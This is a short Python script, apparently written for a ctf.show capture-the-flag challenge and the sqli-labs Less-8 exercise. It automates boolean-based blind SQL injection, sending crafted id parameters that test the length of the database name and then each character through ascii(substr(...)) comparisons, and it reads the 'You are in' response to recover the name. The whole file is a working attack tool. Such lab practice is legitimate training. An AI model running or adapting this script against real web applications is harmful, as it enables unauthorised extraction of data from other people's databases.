"""
http://localhost/sqli-labs-master/Less-8/?id=2 ' and 1=2--+
"""
import time

import requests

url = "http://d7345d2e-d1e7-4ced-a97c-83249213e10d.challenge.ctf.show/select-no-waf-4.php/"


# dbNameLen=-1
def getDbNameLen(url):
    dbNameLen = -1

    for i in range(1, 15):
        time.sleep(0.5)
        payload = "api/v4.php?id=1'+and+length(database())=" + str(i) + "--+"
        fullUrl = url + payload
        # print(fullUrl)
        time.sleep(0.1)
        res = requests.get(url=fullUrl)
        if "You are in" in res.text:
            dbNameLen = i
            break

    return dbNameLen


dbNameLen = getDbNameLen(url)


def getDbName(ur1, dbNameLen):
    dbName = ""
    for i in range(1, dbNameLen + 1):
        for j in range(1, 128):
            time.sleep(0.5)
            payload = "api/v4.php?id=1'+and+ascii(substr(database()," + str(i) + ",1))=" + str(j) + "--+"

            fullUrl = url + payload
            # print ( ful1Ur1)
            res = requests.get(fullUrl)
            if "You are in" in res.text:
                dbName = dbName + chr(j)
                print("[+] The dbName is        ", dbName)
                break
    return dbName


if dbNameLen != -1:

    dbName = getDbName(url, dbNameLen)
    print("---------------------------------------\n[+] The dbName is    ", dbName)
    print("[+] The length of dbName is ", dbNameLen)
    print("Have been complete!\n")
else:
    print("I don't find the result!\n")
    print("Have been complete!\n")
